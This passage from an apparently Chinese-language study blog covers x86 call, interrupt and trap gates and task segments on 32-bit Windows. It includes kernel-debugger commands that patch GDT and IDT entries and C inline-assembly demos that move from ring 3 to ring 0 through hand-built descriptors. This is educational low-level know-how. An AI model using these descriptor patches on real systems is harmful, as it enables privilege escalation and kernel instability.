class=\"number\">807</span>d3090  <span class=\"number\">83e88</span>e00`<span class=\"number\">000842f</span>c <span class=\"number\">83e88</span>e00`<span class=\"number\">000846b</span>0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">401000</span> - <span class=\"number\">83e945</span>c0(<span class=\"type\">int</span> <span class=\"number\">3</span>) = <span class=\"built_in\">base</span>(<span class=\"number\">7</span>C56 CA40)</span><br><span class=\"line\">eq <span class=\"number\">80b</span>99048 <span class=\"number\">7</span>ccf9b56`ca40ffff\t\t\t<span class=\"comment\">// 修改gdtr中的 48</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">eq <span class=\"number\">80b</span>99418  <span class=\"number\">83e9</span>ee00`<span class=\"number\">004845</span>c0\t<span class=\"comment\">// 修改idtr中int3 的段选择子</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; g</span><br><span class=\"line\">Break instruction exception - code <span class=\"number\">80000003</span> (first chance)</span><br><span class=\"line\"><span class=\"number\">001b</span>:<span class=\"number\">004010</span>d4 cc              <span class=\"type\">int</span>     <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/////////////////</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"built_in\">int</span> (__cdecl *DbgPrintf)(_In_z_ _Printf_format_string_ <span class=\"type\">const</span> <span class=\"type\">char</span> * _Format, ...);</span><br><span class=\"line\">DbgPrintf dbgprintf = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"><span class=\"type\">char</span>* shabi = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) <span class=\"built_in\">test</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tsub esp,<span class=\"number\">8</span></span><br><span class=\"line\">\t\tlea eax,haha</span><br><span class=\"line\">\t\tmov [esp],eax</span><br><span class=\"line\">\t\tmov [esp+<span class=\"number\">4</span>],<span class=\"number\">0x8</span></span><br><span class=\"line\">\t\tjmp fword ptr [esp]</span><br><span class=\"line\"></span><br><span class=\"line\">haha:</span><br><span class=\"line\">\t\tadd esp, <span class=\"number\">8</span></span><br><span class=\"line\">\t\tpush fs</span><br><span class=\"line\">\t\tpush <span class=\"number\">0x30</span></span><br><span class=\"line\">\t\tpop fs</span><br><span class=\"line\">\t\tmov eax,[shabi]</span><br><span class=\"line\">\t\tpush eax</span><br><span class=\"line\">\t\tcall dbgprintf</span><br><span class=\"line\">\t\tadd esp,<span class=\"number\">4</span></span><br><span class=\"line\">\t\tpop fs</span><br><span class=\"line\">\t\tmov eax, <span class=\"number\">0x83e945c0</span>\t\t<span class=\"comment\">// int 3</span></span><br><span class=\"line\">\t\tjmp eax</span><br><span class=\"line\">\t\t<span class=\"comment\">// 00401000 - 83e465c0= base(7C5B AA40)</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%x\\r\\n&quot;</span>,test);</span><br><span class=\"line\"></span><br><span class=\"line\">\tdbgprintf = (DbgPrintf)<span class=\"number\">0x83e6441f</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tshabi = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">30</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(shabi,<span class=\"number\">0</span>,<span class=\"number\">30</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(shabi,<span class=\"string\">&quot;shabi!!!!!!!!&quot;</span>,<span class=\"built_in\">strlen</span>(<span class=\"string\">&quot;shabi&quot;</span>));</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">3</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 运行的时候不能直接在调试器里运行，直接运行exe</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231014235313749.png\" alt=\"image-20231014235313749\"></p>\n<h3 id=\"陷阱门\"><a class=\"markdownIt-Anchor\" href=\"#陷阱门\">#</a> 陷阱门</h3>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>ee00`<span class=\"number\">00081000</span></span><br><span class=\"line\">eq <span class=\"number\">80b</span>99500  <span class=\"number\">0040</span>ee00`<span class=\"number\">00081000</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// xianjingmen.cpp : 定义控制台应用程序的入口点。</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> eflags = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) <span class=\"built_in\">test</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tpushfd</span><br><span class=\"line\">\t\tpop eax</span><br><span class=\"line\">\t\tmov [eflags],eax</span><br><span class=\"line\">\t\tpush fs</span><br><span class=\"line\">\t\tpush <span class=\"number\">0x30</span></span><br><span class=\"line\">\t\tpop fs</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">3</span></span><br><span class=\"line\">\t\tpop fs</span><br><span class=\"line\">\t\tiretd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\teflags = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%x\\r\\n&quot;</span>,test);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">32</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\r\\n&quot;</span>,eflags);</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;<span class=\"comment\">// eflag = 46</span></span><br></pre></td></tr></table></figure>\n<p>中断门清空 VM TF IF NT\tELF=0x46</p>\n<p>陷阱门清空 VM TF NT\t\tELF=0x246</p>\n<p>VM 虚拟 8086   TF 调试位   IF 可屏蔽中断  NT 嵌套任务</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231014002754457.png\" alt=\"image-20231014002754457\"></p>\n<h3 id=\"任务段\"><a class=\"markdownIt-Anchor\" href=\"#任务段\">#</a> 任务段</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231014195203261.png\" alt=\"image-20231014195203261\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231014195304362.png\" alt=\"image-20231014195304362\"></p>\n<p>B = busy 当然任务段是否运行，初始 = 0 ，此时 type=9    busy=1 时，type=b，用于判断是否运行过</p>\n<p>previous task link ：前一个任务的连接，上一个运行的任务段，类似于链表指向前一个节点的</p>\n<p>esp0 ss0  0 环</p>\n<p>esp2 2 环</p>\n<p>esp 3 环</p>\n<p>I/O map base 写死的值，用于 IOPL (ELF) ,=0 读写任意端口</p>\n<p>1.22</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">str          # 获取段寄存器的值</span><br><span class=\"line\"></span><br><span class=\"line\">ltr 寄存器/内存   # 设置</span><br><span class=\"line\">    </span><br><span class=\"line\">CPU没有线程，最小执行单元叫做任务。操作系统中最小执行单元是线程</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; r tr</span><br><span class=\"line\">tr=<span class=\"number\">00000028</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; r gdtr </span><br><span class=\"line\">gdtr=<span class=\"number\">80b</span>99000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dq <span class=\"number\">80b</span>99000</span><br><span class=\"line\">ReadVirtual: <span class=\"number\">80b</span>99000 <span class=\"keyword\">not</span> properly sign extended</span><br><span class=\"line\"><span class=\"number\">80b</span>99000  <span class=\"number\">00000000</span>`<span class=\"number\">00000000</span> <span class=\"number\">00</span>cf9b00`<span class=\"number\">0000f</span>fff</span><br><span class=\"line\"><span class=\"number\">80b</span>99010  <span class=\"number\">00</span>cf9300`<span class=\"number\">0000f</span>fff <span class=\"number\">00</span>cffb00`<span class=\"number\">0000f</span>fff</span><br><span class=\"line\"><span class=\"number\">80b</span>99020  <span class=\"number\">00</span>cff300`<span class=\"number\">0000f</span>fff <span class=\"number\">80008b</span>1e`<span class=\"number\">400020</span>ab</span><br><span class=\"line\"><span class=\"number\">80b</span>99030  <span class=\"number\">834093f</span>6`ec003748 <span class=\"number\">0040f</span>300`<span class=\"number\">00000f</span>ff</span><br><span class=\"line\"><span class=\"number\">80b</span>99040  <span class=\"number\">0000f</span>200`<span class=\"number\">0400f</span>fff <span class=\"number\">00000000</span>`<span class=\"number\">00000000</span></span><br><span class=\"line\"><span class=\"number\">80b</span>99050  <span class=\"number\">830089f</span>6`c0000068 <span class=\"number\">830089f</span>6`c0680068</span><br><span class=\"line\"><span class=\"number\">80b</span>99060  <span class=\"number\">00000000</span>`<span class=\"number\">00000000</span> <span class=\"number\">00000000</span>`<span class=\"number\">00000000</span></span><br><span class=\"line\"><span class=\"number\">80b</span>99070  <span class=\"number\">800092b</span>9`<span class=\"number\">900003f</span>f <span class=\"number\">00000000</span>`<span class=\"number\">00000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dt nt!_*TSS*</span><br><span class=\"line\">          ntkrpamp!_KTSS</span><br><span class=\"line\">          </span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dt _KTSS</span><br><span class=\"line\">nt!_KTSS</span><br><span class=\"line\">   +<span class=\"number\">0x000</span> Backlink         : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x002</span> Reserved0        : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x004</span> Esp0             : Uint4B</span><br><span class=\"line\">   +<span class=\"number\">0x008</span> Ss0              : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x00a</span> Reserved1        : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x00c</span> NotUsed1         : [<span class=\"number\">4</span>] Uint4B</span><br><span class=\"line\">   +<span class=\"number\">0x01c</span> CR3              : Uint4B</span><br><span class=\"line\">   +<span class=\"number\">0x020</span> Eip              : Uint4B</span><br><span class=\"line\">   +<span class=\"number\">0x024</span> EFlags           : Uint4B</span><br><span class=\"line\">   +<span class=\"number\">0x028</span> Eax              : Uint4B</span><br><span class=\"line\">   +<span class=\"number\">0x02c</span> Ecx              : Uint4B</span><br><span class=\"line\">   +<span class=\"number\">0x030</span> Edx              : Uint4B</span><br><span class=\"line\">   +<span class=\"number\">0x034</span> Ebx              : Uint4B</span><br><span class=\"line\">   +<span class=\"number\">0x038</span> Esp              : Uint4B</span><br><span class=\"line\">   +<span class=\"number\">0x03c</span> Ebp              : Uint4B</span><br><span class=\"line\">   +<span class=\"number\">0x040</span> Esi              : Uint4B</span><br><span class=\"line\">   +<span class=\"number\">0x044</span> Edi              : Uint4B</span><br><span class=\"line\">   +<span class=\"number\">0x048</span> Es               : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x04a</span> Reserved2        : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x04c</span> Cs               : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x04e</span> Reserved3        : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x050</span> Ss               : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x052</span> Reserved4        : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x054</span> Ds               : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x056</span> Reserved5        : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x058</span> Fs               : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x05a</span> Reserved6        : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x05c</span> Gs               : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x05e</span> Reserved7        : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x060</span> LDT              : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x062</span> Reserved8        : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x064</span> Flags            : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x066</span> IoMapBase        : Uint2B</span><br><span class=\"line\">   +<span class=\"number\">0x068</span> IoMaps           : [<span class=\"number\">1</span>] _KiIoAccessMap</span><br><span class=\"line\">   +<span class=\"number\">0x208c</span> IntDirectionMap  : [<span class=\"number\">32</span>] UChar</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dg <span class=\"number\">28</span></span><br><span class=\"line\">                                  P Si Gr Pr Lo</span><br><span class=\"line\">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class=\"line\">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class=\"line\"><span class=\"number\">0028</span> <span class=\"number\">801</span>ca000 <span class=\"number\">000020</span>ab TSS32 Busy <span class=\"number\">0</span> Nb By P  Nl <span class=\"number\">0000008b</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dt _KTSS <span class=\"number\">801</span>ca000 </span><br><span class=\"line\">ntdll!_KTSS</span><br><span class=\"line\">   +<span class=\"number\">0x000</span> Backlink         : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x002</span> Reserved0        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x004</span> Esp0             : <span class=\"number\">0x8415bcb0</span>  <span class=\"comment\">//</span></span><br><span class=\"line\">   +<span class=\"number\">0x008</span> Ss0              : <span class=\"number\">0x10</span></span><br><span class=\"line\">   +<span class=\"number\">0x00a</span> Reserved1        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x00c</span> NotUsed1         : [<span class=\"number\">4</span>] <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x01c</span> CR3              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x020</span> Eip              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x024</span> EFlags           : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x028</span> Eax              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x02c</span> Ecx              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x030</span> Edx              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x034</span> Ebx              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x038</span> Esp              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x03c</span> Ebp              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x040</span> Esi              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x044</span> Edi              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x048</span> Es               : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x04a</span> Reserved2        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x04c</span> Cs               : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x04e</span> Reserved3        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x050</span> Ss               : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x052</span> Reserved4        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x054</span> Ds               : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x056</span> Reserved5        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x058</span> Fs               : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x05a</span> Reserved6        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x05c</span> Gs               : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x05e</span> Reserved7        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x060</span> LDT              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x062</span> Reserved8        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x064</span> Flags            : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x066</span> IoMapBase        : <span class=\"number\">0x20ac</span></span><br><span class=\"line\">   +<span class=\"number\">0x068</span> IoMaps           : [<span class=\"number\">1</span>] _KiIoAccessMap</span><br><span class=\"line\">   +<span class=\"number\">0x208c</span> IntDirectionMap  : [<span class=\"number\">32</span>]  <span class=\"string\">&quot;???&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1</span>: kd&gt; r esp</span><br><span class=\"line\">esp=<span class=\"number\">80</span>de6ae4</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cr3</span><br><span class=\"line\"><span class=\"number\">393b</span>6000</span><br><span class=\"line\"><span class=\"number\">403378</span></span><br><span class=\"line\"></span><br><span class=\"line\">eq <span class=\"number\">80b</span>95048 <span class=\"number\">0000e940</span>`<span class=\"number\">50300100</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; r tr</span><br><span class=\"line\">tr=<span class=\"number\">00000048</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dg <span class=\"number\">28</span></span><br><span class=\"line\">                                  P Si Gr Pr Lo</span><br><span class=\"line\">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class=\"line\">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class=\"line\"><span class=\"number\">0028</span> <span class=\"number\">801</span>ca000 <span class=\"number\">000020</span>ab TSS32 Busy <span class=\"number\">0</span> Nb By P  Nl <span class=\"number\">0000008b</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dt _KTSS <span class=\"number\">801</span>ca000 </span><br><span class=\"line\">ntdll!_KTSS</span><br><span class=\"line\">   +<span class=\"number\">0x000</span> Backlink         : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x002</span> Reserved0        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x004</span> Esp0             : <span class=\"number\">0x901e3cb0</span></span><br><span class=\"line\">   +<span class=\"number\">0x008</span> Ss0              : <span class=\"number\">0x10</span></span><br><span class=\"line\">   +<span class=\"number\">0x00a</span> Reserved1        : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x00c</span> NotUsed1         : [<span class=\"number\">4</span>] <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x01c</span> CR3              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x020</span> Eip              : <span class=\"number\">0x401111</span></span><br><span class=\"line\">   +<span class=\"number\">0x024</span> EFlags           : <span class=\"number\">0x202</span></span><br><span class=\"line\">   +<span class=\"number\">0x028</span> Eax              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x02c</span> Ecx              : <span class=\"number\">0x3d5e38</span></span><br><span class=\"line\">   +<span class=\"number\">0x030</span> Edx              : <span class=\"number\">0x3d0178</span></span><br><span class=\"line\">   +<span class=\"number\">0x034</span> Ebx              : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x038</span> Esp              : <span class=\"number\">0x12ff2c</span></span><br><span class=\"line\">   +<span class=\"number\">0x03c</span> Ebp              : <span 